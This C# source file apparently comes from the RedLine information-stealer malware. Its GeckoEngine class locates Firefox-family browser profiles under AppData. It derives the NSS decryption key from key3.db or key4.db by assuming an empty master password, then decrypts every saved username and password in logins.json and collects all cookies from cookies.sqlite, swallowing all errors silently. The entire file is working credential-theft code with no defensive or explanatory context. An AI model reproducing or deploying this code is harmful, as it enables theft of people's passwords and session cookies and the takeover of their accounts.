using RedLine.Logic.Extensions;
using RedLine.Logic.Helpers;
using RedLine.Logic.Json;
using RedLine.Logic.SQLite;
using RedLine.Models;
using RedLine.Models.Browsers;
using RedLine.Models.Gecko;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Data;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace RedLine.Logic.Browsers.Gecko
{
	public static class GeckoEngine
	{
		public static List<Browser> ParseBrowsers()
		{
			List<Browser> list = new List<Browser>();
			try
			{
				List<string> list2 = new List<string>();
				list2.AddRange(DecryptHelper.FindPaths(Constants.LocalAppData, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));
				list2.AddRange(DecryptHelper.FindPaths(Constants.RoamingAppData, 4, 1, "key3.db", "key4.db", "cookies.sqlite", "logins.json"));
				foreach (string item in list2)
				{
					string fullName = new FileInfo(item).Directory.FullName;
					string text = item.Contains(Constants.RoamingAppData) ? GetRoamingName(fullName) : GetLocalName(fullName);
					if (!string.IsNullOrEmpty(text))
					{
						Browser browser = new Browser
						{
							Name = text,
							Profile = new DirectoryInfo(fullName).Name,
							Cookies = new List<Cookie>(ParseCookies(fullName)).IsNull(),
							Credentials = new List<LoginPair>(GetCredentials(fullName).IsNull()).IsNull(),
							Autofills = new List<Autofill>(),
							CreditCards = new List<CreditCard>()
						};
						if (browser.Cookies.Count((Cookie x) => x.IsNotNull()) > 0 || browser.Credentials.Count((LoginPair x) => x.IsNotNull()) > 0)
						{
							list.Add(browser);
						}
					}
				}
				return list;
			}
			catch
			{
				return list;
			}
		}

		private static List<LoginPair> GetCredentials(string profile)
		{
			List<LoginPair> list = new List<LoginPair>();
			try
			{
				if (File.Exists(Path.Combine(profile, "key3.db")))
				{
					list.AddRange(ParseLogins(profile, GetPrivate3Key(DecryptHelper.CreateTempCopy(Path.Combine(profile, "key3.db")))));
				}
				if (!File.Exists(Path.Combine(profile, "key4.db")))
				{
					return list;
				}
				list.AddRange(ParseLogins(profile, GetPrivate4Key(DecryptHelper.CreateTempCopy(Path.Combine(profile, "key4.db")))));
				return list;
			}
			catch
			{
				return list;
			}
		}

		private static List<Cookie> ParseCookies(string profile)
		{
			List<Cookie> list = new List<Cookie>();
			try
			{
				string text = Path.Combine(profile, "cookies.sqlite");
				if (!File.Exists(text))
				{
					return list;
				}
				SqlConnection sqlConnection = new SqlConnection(DecryptHelper.CreateTempCopy(text));
				sqlConnection.ReadTable("moz_cookies");
				for (int i = 0; i < sqlConnection.RowLength; i++)
				{
					Cookie cookie = null;
					try
					{
						cookie = new Cookie
						{
							Host = sqlConnection.ParseValue(i, "host").Trim(),
							Http = (sqlConnection.ParseValue(i, "isSecure") == "1"),
							Path = sqlConnection.ParseValue(i, "path").Trim(),
							Secure = (sqlConnection.ParseValue(i, "isSecure") == "1"),
							Expires = sqlConnection.ParseValue(i, "expiry").Trim(),
							Name = sqlConnection.ParseValue(i, "name").Trim(),
							Value = sqlConnection.ParseValue(i, "value")
						};
					}
					catch
					{
					}
					if (cookie != null)
					{
						list.Add(cookie);
					}
				}
				return list;
			}
			catch
			{
				return list;
			}
		}

		private static List<LoginPair> ParseLogins(string profile, byte[] privateKey)
		{
			List<LoginPair> list = new List<LoginPair>();
			try
			{
				string path = DecryptHelper.CreateTempCopy(Path.Combine(profile, "logins.json"));
				if (File.Exists(path))
				{
					{
						foreach (JsonValue item in (IEnumerable)File.ReadAllText(path).FromJSON()["logins"])
						{
							Asn1Object asn1Object = Asn1Factory.Create(Convert.FromBase64String(item["encryptedUsername"].ToString(saving: false)));
							Asn1Object asn1Object2 = Asn1Factory.Create(Convert.FromBase64String(item["encryptedPassword"].ToString(saving: false)));
							string text = Regex.Replace(TripleDESHelper.Decrypt(privateKey, asn1Object.Objects[0].Objects[1].Objects[1].ObjectData, asn1Object.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
							string text2 = Regex.Replace(TripleDESHelper.Decrypt(privateKey, asn1Object2.Objects[0].Objects[1].Objects[1].ObjectData, asn1Object2.Objects[0].Objects[2].ObjectData, PaddingMode.PKCS7), "[^\\u0020-\\u007F]", string.Empty);
							LoginPair loginPair = new LoginPair
							{
								Host = (string.IsNullOrEmpty(item["hostname"].ToString(saving: false)) ? "UNKNOWN" : item["hostname"].ToString(saving: false)),
								Login = (string.IsNullOrEmpty(text) ? "UNKNOWN" : text),
								Password = (string.IsNullOrEmpty(text2) ? "UNKNOWN" : text2)
							};
							if (loginPair.Login != "UNKNOWN" && loginPair.Password != "UNKNOWN" && loginPair.Host != "UNKNOWN")
							{
								list.Add(loginPair);
							}
						}
						return list;
					}
				}
				return list;
			}
			catch
			{
				return list;
			}
		}

		private static byte[] GetPrivate4Key(string file)
		{
			byte[] result = new byte[24];
			try
			{
				if (!File.Exists(file))
				{
					return result;
				}
				SqlConnection sqlConnection = new SqlConnection(file);
				sqlConnection.ReadTable("metaData");
				string s = sqlConnection.ParseValue(0, "item1");
				string s2 = sqlConnection.ParseValue(0, "item2)");
				Asn1Object asn1Object = Asn1Factory.Create(Encoding.Default.GetBytes(s2));
				byte[] objectData = asn1Object.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
				byte[] objectData2 = asn1Object.Objects[0].Objects[1].ObjectData;
				GeckoPasswordBasedEncryption geckoPasswordBasedEncryption = new GeckoPasswordBasedEncryption(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData);
				geckoPasswordBasedEncryption.Init();
				TripleDESHelper.Decrypt(geckoPasswordBasedEncryption.DataKey, geckoPasswordBasedEncryption.DataIV, objectData2);
				sqlConnection.ReadTable("nssPrivate");
				int rowLength = sqlConnection.RowLength;
				string s3 = string.Empty;
				for (int i = 0; i < rowLength; i++)
				{
					if (sqlConnection.ParseValue(i, "a102") == Encoding.Default.GetString(Constants.Key4MagicNumber))
					{
						s3 = sqlConnection.ParseValue(i, "a11");
						break;
					}
				}
				Asn1Object asn1Object2 = Asn1Factory.Create(Encoding.Default.GetBytes(s3));
				objectData = asn1Object2.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData;
				objectData2 = asn1Object2.Objects[0].Objects[1].ObjectData;
				geckoPasswordBasedEncryption = new GeckoPasswordBasedEncryption(Encoding.Default.GetBytes(s), Encoding.Default.GetBytes(string.Empty), objectData);
				geckoPasswordBasedEncryption.Init();
				result = Encoding.Default.GetBytes(TripleDESHelper.Decrypt(geckoPasswordBasedEncryption.DataKey, geckoPasswordBasedEncryption.DataIV, objectData2, PaddingMode.PKCS7));
				return result;
			}
			catch
			{
				return result;
			}
		}

		private static byte[] GetPrivate3Key(string file)
		{
			byte[] array = new byte[24];
			try
			{
				if (!File.Exists(file))
				{
					return array;
				}
				new DataTable();
				GeckoDatabase berkeleyDB = new GeckoDatabase(file);
				PasswordCheck passwordCheck = new PasswordCheck(ParseDb(berkeleyDB, (string x) => x.Equals("password-check")));
				string hexString = ParseDb(berkeleyDB, (string x) => x.Equals("global-salt"));
				GeckoPasswordBasedEncryption geckoPasswordBasedEncryption = new GeckoPasswordBasedEncryption(DecryptHelper.ConvertHexStringToByteArray(hexString), Encoding.Default.GetBytes(string.Empty), DecryptHelper.ConvertHexStringToByteArray(passwordCheck.EntrySalt));
				geckoPasswordBasedEncryption.Init();
				TripleDESHelper.Decrypt(geckoPasswordBasedEncryption.DataKey, geckoPasswordBasedEncryption.DataIV, DecryptHelper.ConvertHexStringToByteArray(passwordCheck.Passwordcheck));
				Asn1Object asn1Object = Asn1Factory.Create(DecryptHelper.ConvertHexStringToByteArray(ParseDb(berkeleyDB, (string x) => !x.Equals("password-check") && !x.Equals("Version") && !x.Equals("global-salt"))));
				GeckoPasswordBasedEncryption geckoPasswordBasedEncryption2 = new GeckoPasswordBasedEncryption(DecryptHelper.ConvertHexStringToByteArray(hexString), Encoding.Default.GetBytes(string.Empty), asn1Object.Objects[0].Objects[0].Objects[1].Objects[0].ObjectData);
				geckoPasswordBasedEncryption2.Init();
				Asn1Object asn1Object2 = Asn1Factory.Create(Asn1Factory.Create(Encoding.Default.GetBytes(TripleDESHelper.Decrypt(geckoPasswordBasedEncryption2.DataKey, geckoPasswordBasedEncryption2.DataIV, asn1Object.Objects[0].Objects[1].ObjectData))).Objects[0].Objects[2].ObjectData);
				if (asn1Object2.Objects[0].Objects[3].ObjectData.Length <= 24)
				{
					array = asn1Object2.Objects[0].Objects[3].ObjectData;
					return array;
				}
				Array.Copy(asn1Object2.Objects[0].Objects[3].ObjectData, asn1Object2.Objects[0].Objects[3].ObjectData.Length - 24, array, 0, 24);
				return array;
			}
			catch
			{
				return array;
			}
		}

		private static string ParseDb(GeckoDatabase berkeleyDB, Func<string, bool> predicate)
		{
			string text = string.Empty;
			try
			{
				foreach (KeyValuePair<string, string> key in berkeleyDB.Keys)
				{
					if (predicate(key.Key))
					{
						text = key.Value;
					}
				}
			}
			catch
			{
			}
			return text.Replace("-", string.Empty);
		}

		private static string GetRoamingName(string profilesDirectory)
		{
			string text = string.Empty;
			try
			{
				string[] array = profilesDirectory.Split(new string[1]
				{
					"AppData\\Roaming\\"
				}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				text = ((!(array[2] == "Profiles")) ? array[0] : array[1]);
			}
			catch
			{
			}
			return text.Replace(" ", string.Empty);
		}

		private static string GetLocalName(string profilesDirectory)
		{
			string text = string.Empty;
			try
			{
				string[] array = profilesDirectory.Split(new string[1]
				{
					"AppData\\Local\\"
				}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				text = ((!(array[2] == "Profiles")) ? array[0] : array[1]);
			}
			catch
			{
			}
			return text.Replace(" ", string.Empty);
		}
	}
}
